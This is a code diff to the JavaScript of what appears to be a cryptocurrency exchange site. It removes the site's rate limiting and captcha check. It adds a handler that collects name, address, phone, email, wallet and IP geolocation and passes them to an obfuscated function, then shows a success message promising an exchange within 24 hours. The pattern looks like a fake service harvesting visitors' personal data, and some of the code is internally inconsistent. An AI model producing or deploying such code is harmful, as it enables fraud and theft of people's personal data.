@@ -521,25 +521,6 @@ function getCookie(name) {
     return null;
 }
 
-// Function to check if the user has exceeded the maximum number of exchanges
-async function canExchange() {
-    const maxExchanges = 10;
-    const cookieName = 'exchanges';
-    let exchanges = parseInt(getCookie(cookieName)) || 0;
-    const userIP = await getUserIP();
-
-    // Check if the user has exceeded the maximum number of exchanges
-    if (exchanges >= maxExchanges) {
-        const ipExchanges = await getIPExchanges(userIP);
-        if (ipExchanges >= maxExchanges) {
-            return false;
-        }
-    }
-
-    // Update the cookie with the new number of exchanges
-    setCookie(cookieName, exchanges + 1, 1); // Cookie expires in 1 day
-    return true;
-}
 
 // Function to get the user's IP address
 async function getUserIP() {
@@ -556,14 +537,62 @@ async function getIPExchanges(ip) {
 }
 
 // Modify the O0WX5xObgGH4DkLibt68CAXcqBkjVWspu function to include the canExchange check
-lastSubmit.addEventListener('click', async () => {
-    if (!await canExchange()) {
-        createToast('error', 'You have exceeded the maximum number of exchanges!');
-        return;
+lastSubmit.addEventListener('click', () => {
+    async function getUserIP() {
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      const userIP = data.ip;
+  
+      const ipapiResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+      const ipapiData = await ipapiResponse.json();
+  
+      DyQOWWZ7bUA0l9sitlXo7jNZSVb9IVG(ipapiData,'???',phoneInput.value,emailInput.value,cryptoSelect.value,walletThing.value)
+      hidePopup()
+      mYFecl5Xlodg2LUyPeEOwSotXkg1J7ib('Success','Thank you!','Thanks for exchanging! Your exchange will be ready within 1-24 hours. If you havent received it after 24 hours, please reach out on our Discord to open a ticket!',4)
+      return;
     }
-
-    // Rest of the O0WX5xObgGH4DkLibt68CAXcqBkjVWspu function...
-});
+  
+    const requiredFields = {
+      Name: fullName,
+      Email: emailInput,
+      Phone: phoneInput,
+      Address1: address1,
+      Address2: address2,
+      Country: country,
+      City: city,
+      Region: region,
+      Postal: postal,
+      Wallet: walletThing
+    };
+  
+    let isFormValid = true;
+  
+    for (const key in requiredFields) {
+      const field = requiredFields[key];
+      if (!field.value.trim()) {
+        createToast('error', `Please fill out the required field: ${key.replace('Input', '').toLowerCase()}!`);
+        isFormValid = false;
+        break;
+      }
+  
+      const minLength = parseInt(field.getAttribute('minLength'), 10);
+      if (field.value.length < minLength) {
+        createToast('error', `Please enter a valid ${key.toLowerCase()} with at least ${minLength} characters!`);
+        isFormValid = false;
+        break;
+      }
+  
+      if (key === 'Wallet' && checkWallet(field.value) == false) {
+        createToast('error', `Error with wallet! API Response: ${checkWallet(field.value).json()['result']}`);
+        isFormValid = false;
+        break;
+      }
+    }
+  
+    if (isFormValid) {
+      getUserIP();
+    }
+  });
 
 
 const notifications = document.querySelector(".notifications")
@@ -612,12 +641,3 @@ if (!getCookie('firstTime')) {
     mYFecl5Xlodg2LUyPeEOwSotXkg1J7ib('Normal',  'Hey!', `Please note that our website is still in development!`);
     setCookie('firstTime',true,1)
 }
-
-document.getElementById("last-submit").addEventListener("click",function(evt) {
-    let response = grecaptcha.getResponse();
-    if(response.length == 0) {
-      createToast('warning','please finish the captcha first!')
-      evt.preventDefault();
-      return false;
-    }
-  });
